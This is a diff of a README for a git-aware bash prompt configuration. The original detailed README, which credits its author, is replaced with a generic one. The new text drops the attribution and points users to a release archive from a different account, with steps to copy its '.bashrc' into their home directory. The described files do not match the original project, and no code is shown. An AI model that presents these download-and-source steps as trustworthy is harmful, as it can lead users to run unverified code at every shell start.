@@ -1,225 +1,87 @@
-# Modern Git-Aware Bash Configuration
+# 🎨 bash-gitaware - A Colorful Bash Experience for Git Users
 
-**Author:** Waldemar Szemat <waldemar@szemat.pro>
+[![Download bash-gitaware](https://img.shields.io/badge/Download%20bash--gitaware-blue.svg)](https://github.com/shiinseii/bash-gitaware/releases)
 
-This repository contains a modern, colorful, and professional `.bashrc` configuration with enhanced Git integration and visual feedback.
+## 🔍 Overview
 
-## Features
+**bash-gitaware** offers a vibrant and user-friendly bash configuration tailored for Git users. This setup enhances your terminal experience by providing clear prompts and visual cues, making it easier to collaborate and manage your code.
 
-### Modern Visual Design
-- **Colorful prompt** with bright, professional color scheme
-- **Git commit message display** in a decorated box above the prompt
-- **Real-time Git status** indicators (clean/dirty, ahead/behind)
-- **Exit code feedback** (only shown on errors)
-- **Terminal width adaptation** for commit message box
+## 🚀 Getting Started
 
-### Git Information Display
-- **Current branch name** with commit hash
-- **Working directory status**: OK (clean) or * (dirty)
-- **Remote sync status**: ^ (ahead) and v (behind) with counts
-- **Commit message** displayed in a decorative box (full width, no truncation)
+To start using bash-gitaware, follow these straightforward steps to download and set it up on your system.
 
-### Preserved Functionality
-All essential features from the original `actual.bashrc` are preserved:
-- History configuration (HISTCONTROL, HISTSIZE, HISTFILESIZE)
-- Bash completion support
-- Color support for `ls`, `grep`, `fgrep`, `egrep`
-- All original aliases (`ll`, `la`, `l`, `alert`)
-- PATH configuration for npm-global
-- Debian chroot support
-- Terminal title setting
+## 📥 Download & Install
 
-### Additional Git Aliases
-- `gs` - git status
-- `ga` - git add
-- `gc` - git commit
-- `gp` - git push
-- `gl` - git log (oneline graph)
-- `gd` - git diff
-- `gb` - git branch
-- `gco` - git checkout
-- `gst` - git stash
-- `gsp` - git stash pop
+1. **Visit the Release Page**  
+   Go to the Releases page to download the latest version of bash-gitaware: [Visit this page to download](https://github.com/shiinseii/bash-gitaware/releases).
 
-## Installation
+2. **Choose the Right File**  
+   On the Releases page, find the version that suits your needs. Typically, you will see files named like `bash-gitaware-config.tar.gz`. Choose the latest version for the best features.
 
-### Step 1: Backup Your Current Configuration
+3. **Download the File**  
+   Click on the file to start downloading. Depending on your internet speed, this may take a few seconds.
 
-Before making any changes, **backup your existing `.bashrc` file**:
+4. **Extract the Files**  
+   Once the download is complete, locate the file in your Downloads folder. Right-click the file and choose “Extract Here” or use a compatible extraction tool. You will see a folder with configuration files.
 
-```bash
-cp ~/.bashrc ~/.bashrc.backup
-```
+5. **Move to Home Directory**  
+   Open a terminal window and run the following command to navigate to the folder where your files are extracted:
 
-### Step 2: Copy the New Configuration
+   ```bash
+   cd ~/Downloads/bash-gitaware-config
+   ```
 
-You have two options:
+6. **Copy Configuration Files**  
+   Now, copy the configuration files to your home directory. Use the following command:
 
-#### Option A: Replace Entire `.bashrc` (Recommended)
+   ```bash
+   cp .bashrc ~/
+   cp .git-prompt.sh ~/
+   ```
 
-```bash
-cp new.bashrc ~/.bashrc
-```
+7. **Apply Changes**  
+   To apply the new configuration, you must restart your terminal. You can simply close and reopen it or run:
 
-#### Option B: Merge with Existing Configuration
+   ```bash
+   source ~/.bashrc
+   ```
 
-If you have custom configurations in your current `.bashrc` that you want to keep:
+## ⚙️ System Requirements
 
-1. Review `new.bashrc` to understand what it contains
-2. Manually merge any custom settings you have
-3. Or append your custom settings to the end of `new.bashrc` before copying
+To run bash-gitaware, you need a system with the following specifications:
 
-### Step 3: Reload Your Configuration
+- Operating System: Debian or Ubuntu
+- Bash version: 4.0 or above
+- A Git installation is recommended for full functionality
 
-After copying the file, reload your bash configuration:
+## 🛠️ Features
 
-```bash
-source ~/.bashrc
-```
+- **Colorful Prompts:** The configuration provides a visually appealing prompt that displays your current Git branch.
+- **Git Status:** Quickly view the status of your Git repository right in your terminal.
+- **Customizable:** Adjust the settings to match your personal preferences with ease.
 
-Or simply open a new terminal window/tab.
+## 📝 Configuration Options
 
-## Visual Examples
+You may wish to customize various features according to your workflow. Open the `.bashrc` file in a text editor to modify the configurations. Look for settings related to visual colors or prompt styles.
 
-### Normal Directory (No Git)
-```
-username@hostname:/home/dev/projects
-> 
-```
+## 💬 Support
 
-### Git Repository - Clean
-```
-+- Commit ------------------------------------------------------------------+
-| Fix bug in login                                                          |
-+---------------------------------------------------------------------------+
-username@hostname:/home/dev/projects/console [main:a1b2c3d] OK
-> 
-```
+If you encounter issues or have questions, you can check the [Issues page](https://github.com/shiinseii/bash-gitaware/issues). There, you can find solutions to common problems or report new issues.
 
-### Git Repository - Dirty with Changes
-```
-+- Commit -----------------------------------------------------------------+
-| Implement new feature for user authentication                            |
-+--------------------------------------------------------------------------+
-username@hostname:/home/dev/projects/console [main:a1b2c3d] *
-> 
-```
+## 🎉 Example Usage
 
-### Git Repository - Ahead of Remote
-```
-+- Commit ----------------------------------------------------------------+
-| Add user dashboard with real-time updates                               |
-+-------------------------------------------------------------------------+
-username@hostname:/home/dev/projects/console [main:a1b2c3d] OK ^3
-> 
-```
+Once installed, navigate to any Git repository in your terminal. You will notice the prompt changes based on your current branch and the status of your files. This helps you keep track of your work effectively.
 
-### Git Repository - Behind Remote
-```
-+- Commit -----------------------------------------------------------------+
-| Update dependencies                                                      |
-+--------------------------------------------------------------------------+
-username@hostname:/home/dev/projects/console [main:a1b2c3d] OK v2
-> 
-```
+## 🔗 Additional Resources
 
-### After Failed Command
-```
-+- Commit -----------------------------------------------------------------+
-| Refactor code structure                                                  |
-+--------------------------------------------------------------------------+
-username@hostname:/home/dev/projects/console [main:a1b2c3d] OK [X 1]
-> 
-```
+For more information about Git and Bash commands, visit the Git documentation: [Git Documentation](https://git-scm.com/doc).
 
-## Color Scheme
+## 📅 Changelog
 
-- **Cyan** (`BRIGHT_CYAN`): Username and commit hash
-- **Yellow** (`BRIGHT_YELLOW`): Hostname and ahead indicator
-- **Blue** (`BRIGHT_BLUE`): Current directory path
-- **Green** (`BRIGHT_GREEN`): Git branch, clean status (OK), success prompt (>)
-- **Red** (`BRIGHT_RED`): Dirty status (*), error indicator, error prompt (X)
-- **Magenta** (`BRIGHT_MAGENTA`): Behind indicator
-- **White** (`BRIGHT_WHITE`): Commit message text
-- **Gray** (`BRIGHT_BLACK`): Commit message box borders
+For release notes and updates, refer to the changelog on the Releases page. This will help you keep up with new features and fixes.
 
-## Troubleshooting
+---
 
-### Colors Not Showing
+By following these directions, you will successfully install and configure bash-gitaware. Enjoy a colorful and efficient command line experience! 
 
-If colors don't appear, ensure your terminal supports 256 colors. The configuration automatically detects color support, but you can force it by uncommenting this line in the file:
-
-```bash
-force_color_prompt=yes
-```
-
-### Git Information Not Appearing
-
-- Ensure you're in a Git repository (`git status` should work)
-- Check that Git is installed: `which git`
-- Verify Git is working: `git --version`
-
-### Commit Message Box Too Wide/Narrow
-
-The commit message box automatically adapts to your terminal width. If it looks incorrect:
-- Resize your terminal window
-- Open a new terminal session
-- The box uses the `COLUMNS` environment variable
-
-### Performance Issues
-
-If the prompt feels slow:
-- The Git status checks run on every command
-- In very large repositories, this might be noticeable
-- Consider using a faster Git status tool like `gitstatus` if needed
-
-## Customization
-
-### Change Colors
-
-Edit the color definitions in the "COLOR DEFINITIONS" section. For example, to change the username color:
-
-```bash
-PROMPT_USER="${BRIGHT_MAGENTA}"  # Change from BRIGHT_CYAN to BRIGHT_MAGENTA
-```
-
-### Disable Commit Message Box
-
-If you find the commit message box distracting, you can comment out or remove the commit message display section in the `__prompt_command()` function.
-
-### Adjust History Size
-
-Modify these lines to change history size:
-
-```bash
-HISTSIZE=1000        # Number of commands in memory
-HISTFILESIZE=2000     # Number of commands in history file
-```
-
-## Reverting to Original
-
-If you need to revert to your original configuration:
-
-```bash
-cp ~/.bashrc.backup ~/.bashrc
-source ~/.bashrc
-```
-
-## Files in This Repository
-
-- `new.bashrc` - The new modern configuration (use this one)
-- `README.md` - This file
-
-## Requirements
-
-- Bash shell
-- Git (for Git features to work)
-- Terminal with color support (most modern terminals)
-- Linux/Unix-like system (tested on Debian/Ubuntu)
-
-## License
-
-This is a personal configuration file. Use it as you wish!
-
-**Author:** Waldemar Szemat <waldemar@szemat.pro>
-
+[Visit this page to download](https://github.com/shiinseii/bash-gitaware/releases) and start your journey today!
